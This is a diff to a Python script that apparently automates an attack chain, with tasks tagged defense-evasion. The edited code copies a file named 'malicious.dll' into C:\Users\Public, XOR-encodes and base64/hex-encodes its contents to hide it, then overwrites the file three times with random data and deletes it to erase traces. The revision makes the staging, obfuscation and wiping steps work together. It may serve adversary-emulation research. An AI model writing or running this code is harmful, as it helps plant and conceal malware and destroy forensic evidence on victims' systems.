@@ -5,62 +5,38 @@ from typing import Dict, Any
 def task_T1(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
     start = time.time()
     input_data = input_data or {}
-    target_dir = "C:\\Users\\Public\\"
     dll_name = "malicious.dll"
-    source_dll_path = f"C:\\path\\to\\{dll_name}"  # This should be the path to the malicious DLL
-
+    source_dll_path = os.path.join(os.getcwd(), dll_name)
+    target_dir = "C:\\Users\\Public\\"
+    dll_path = os.path.join(target_dir, dll_name)
+    
     try:
-        # Attempt to copy the malicious DLL to the target directory
-        try:
-            shutil.copy(source_dll_path, target_dir)
-        except Exception as e:
-            # Log the error and proceed to check if the DLL is loaded
-            print(f"Error copying DLL: {e}")
-
-        # Check if the DLL is placed in the target directory
-        dll_loaded = os.path.exists(os.path.join(target_dir, dll_name))
-
-        # Prepare the result
-        result = {
-            "path": os.path.join(target_dir, dll_name) if dll_loaded else None,
-            "dll_name": dll_name
-        }
-
-        return {'success': True, 'data': result,
+        shutil.copy(source_dll_path, target_dir)
+        dll_loaded = os.path.exists(dll_path)
+        result = {'dll_path': dll_path if dll_loaded else None}
+        return {'success': dll_loaded, 'data': result,
                 'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}
     except Exception as e:
-        return {'success': False, 'error': f'{type(e).__name__}: {e}',
+        result = {'dll_path': None}
+        return {'success': False, 'data': result, 'error': f'{type(e).__name__}: {e}',
                 'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}
-
-def xor_encrypt(data: bytes, key: bytes) -> bytes:
-    """XOR encrypt the data with the given key."""
-    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))
 
 def task_T2(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
     start = time.time()
     input_data = input_data or {}
     try:
-        # Retrieve the path and dll_name from input_data
-        path = input_data.get('path', '')
-        dll_name = input_data.get('dll_name', '')
-
-        # Combine path and dll_name to form a payload
-        payload = f"{path}\\{dll_name}".encode()
-
-        # Define a consistent non-trivial XOR key
+        dll_path = input_data.get('dll_path', '')
+        
+        with open(dll_path, 'rb') as f:
+            payload = f.read()
+        
         xor_key = b'\x3f'
-
-        # XOR encrypt the payload
-        xor_encrypted = xor_encrypt(payload, xor_key)
-
-        # Base64 encode the XOR encrypted data
-        base64_encoded = base64.b64encode(xor_encrypted).decode()
-
-        # Prepare the result
-        result = {
-            "encoded_data": base64_encoded
-        }
-
+        xored_payload = bytes(b ^ xor_key[0] for b in payload)
+        encoded_data = base64.b64encode(xored_payload)
+        encoded_data_hex = encoded_data.hex()
+        
+        result = {'encoded_data': encoded_data_hex}
+        
         return {'success': True, 'data': result,
                 'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}
     except Exception as e:
@@ -68,34 +44,27 @@ def task_T2(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
                 'error': f'{type(e).__name__}: {e}',
                 'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}
 
-def task_T3(input_data: dict = None) -> dict:
+def task_T3(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
     start = time.time()
     input_data = input_data or {}
     try:
-        # Define the path to the dropper file
-        dropper_path = "C:\\path\\to\\dropper.exe"
-
-        # Check if the file exists
-        if os.path.exists(dropper_path):
-            # Get the size of the file
-            file_size = os.path.getsize(dropper_path)
-
-            # Overwrite the file with random data
-            with open(dropper_path, 'r+b') as f:
-                for _ in range(3):  # Three passes for secure deletion
-                    f.seek(0)
+        dll_path = input_data.get('dll_path', '')
+        
+        if os.path.exists(dll_path):
+            file_size = os.path.getsize(dll_path)
+            
+            with open(dll_path, 'wb') as f:
+                for _ in range(3):
                     f.write(os.urandom(file_size))
                     f.flush()
                     os.fsync(f.fileno())
-
-            # Remove the file
-            os.remove(dropper_path)
-
+            
+            os.remove(dll_path)
+        
         result = {'success': True}
         return {'success': True, 'data': result,
                 'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}
     except FileNotFoundError:
-        # If the file is not found, consider the task successful as the file is already absent
         result = {'success': True}
         return {'success': True, 'data': result,
                 'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}
@@ -125,22 +94,6 @@ def main() -> dict:
         failed.append('T1')
         results['T1'] = {'success': False, 'error': str(e)}
     
-    # ── T3: Delete Original Dropper [defense-evasion] ──
-    try:
-        r = task_T3(None)
-        results['T3'] = r
-        if r.get('success'):
-            outputs['T3'] = r.get('data', {})
-            print(f'[+] T3 (Delete Original Dropper): OK')
-        else:
-            err = r.get('error', 'unknown')
-            print(f'[-] T3 (Delete Original Dropper): FAILED — {err}')
-            failed.append('T3')
-    except Exception as e:
-        print(f'[!] T3 crashed: {e}')
-        failed.append('T3')
-        results['T3'] = {'success': False, 'error': str(e)}
-    
     # ── T2: Encode Payload [defense-evasion] ──
     try:
         r = task_T2(outputs.get('T1', {}))
@@ -156,6 +109,22 @@ def main() -> dict:
         print(f'[!] T2 crashed: {e}')
         failed.append('T2')
         results['T2'] = {'success': False, 'error': str(e)}
+    
+    # ── T3: Delete Dropper File [defense-evasion] ──
+    try:
+        r = task_T3(outputs.get('T1', {}))
+        results['T3'] = r
+        if r.get('success'):
+            outputs['T3'] = r.get('data', {})
+            print(f'[+] T3 (Delete Dropper File): OK')
+        else:
+            err = r.get('error', 'unknown')
+            print(f'[-] T3 (Delete Dropper File): FAILED — {err}')
+            failed.append('T3')
+    except Exception as e:
+        print(f'[!] T3 crashed: {e}')
+        failed.append('T3')
+        results['T3'] = {'success': False, 'error': str(e)}
     
     success = len(failed) == 0
     if success:
